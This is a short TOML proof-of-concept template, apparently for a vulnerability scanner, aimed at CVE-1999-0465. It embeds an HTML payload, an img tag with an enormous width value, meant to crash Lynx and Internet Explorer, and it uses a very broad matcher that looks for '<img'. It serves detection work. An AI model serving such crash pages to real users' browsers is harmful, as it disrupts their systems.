[info]
author = "AVE"
description = "通过包含超大 width 参数的 IMG 标签 HTML 页面，验证目标 Web 服务器是否可提供导致 Lynx/IE 浏览器崩溃的恶意页面"
id = "POC-AVE-1999-0720"
name = "CVE-1999-0465 PoC"
severity = "critical"
tags = ["ave-1999-0720"]
vuln_id = [
    "CVE-1999-0465",
    "AVE-1999-0720",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cve-1999-0465-poc.html"
protocol = "http"

[poc.requests.body]
content = '<html><body><img width="999999999" src="https://example.com/test.gif"></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<img"]
